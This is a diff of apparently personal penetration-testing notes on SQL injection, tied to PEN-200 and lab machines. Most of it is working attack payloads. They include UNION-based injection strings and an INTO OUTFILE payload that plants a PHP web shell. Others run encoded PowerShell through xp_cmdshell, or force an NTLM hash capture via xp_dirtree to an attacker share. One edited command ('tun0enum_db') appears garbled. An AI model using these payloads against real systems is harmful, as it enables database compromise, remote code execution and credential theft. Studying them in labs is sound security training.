@@ -14,7 +14,7 @@ Lock in w me twin
 mysql [--skip-ssl] -h [IP] -u[username] -p[pass]
 ```
 
-{% code title="Info Dumping" %}
+{% code title="Raw Info Dumping (Use in Blind)" %}
 ```sql
 SELECT DISTINCT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1
 SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='[db]' LIMIT 0,1
@@ -22,17 +22,31 @@ SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='[db]' and
 ```
 {% endcode %}
 
+{% code title="Front End facing applications" %}
 ```sql
-man' UNION select 1,@@version,3,4,5,6;-- - [assuming column 3 content gets diplayed on webpage]
+man' UNION select 1,@@version,3,4,5,6;-- - [assuming column 2 content gets diplayed on webpage]
 1' order by <number> --It will order by column number specified, only return error when that column number does not exist
 --Need to figure out data type used by each column to know where to inject
 ```
+{% endcode %}
 
 #### What's this?
 
+{% code title="Sorting rev shell auth or anywhere else really" %}
 ```
 ‘ UNION SELECT (“<?php echo passthru($_GET[‘cmd’]);”) INTO OUTFILE ‘C:/xampp/htdocs/cmd.php’ — -’
 ```
+{% endcode %}
+
+{% hint style="info" %}
+MedTech \[PEN-200]
+{% endhint %}
+
+{% code title="MSSQL Implementation" overflow="wrap" %}
+```
+admin'; EXEC xp_cmdshell 'powershell -e [base64_code]';-- 
+```
+{% endcode %}
 
 ### Error Based&#x20;
 
@@ -109,6 +123,8 @@ wtf is out of band interaction fr
 Refer StreamIO \[Medium]
 {% endhint %}
 
+Watch for `C:/SQLServer/Logs/ERRORLOG.BAK`
+
 ```
 .\SQLCMD.EXE -S localhost -U [user] -P [password] -d [database] -Q "select table_name from streamio_backup.information_schema.tables;"
 
@@ -119,7 +135,7 @@ EXECUTE sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 EXECUTE xp_cmdshell 'whoami';
 
-sudo responder -I tun0
+sudo responder -I tun0enum_db
 EXEC master.sys.xp_dirtree '\\10.10.14.9\myshare',1, 1
 ```
 
